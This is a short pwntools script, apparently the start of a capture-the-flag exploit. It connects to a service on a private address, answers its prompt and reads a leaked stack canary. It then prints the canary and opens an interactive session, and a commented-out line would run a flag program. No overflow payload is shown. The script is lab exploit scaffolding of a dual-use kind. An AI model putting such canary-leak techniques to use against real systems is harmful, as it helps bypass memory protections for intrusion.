from pwn import *
context.log_level = 'debug' 

sh = remote('10.15.201.97', 10001)

sh.recvuntil("[?] Are you smiling right now? (y/n)")
sh.sendline('y')
sh.recvuntil("[!] here is a gift for smiling: ")
canary=int(sh.recvline(),16)

sh.recvuntil("Reading:")

print('canary = %#x' %canary)

# sh.sendline("./etc/flag.exe 3180105507")
sh.interactive() 



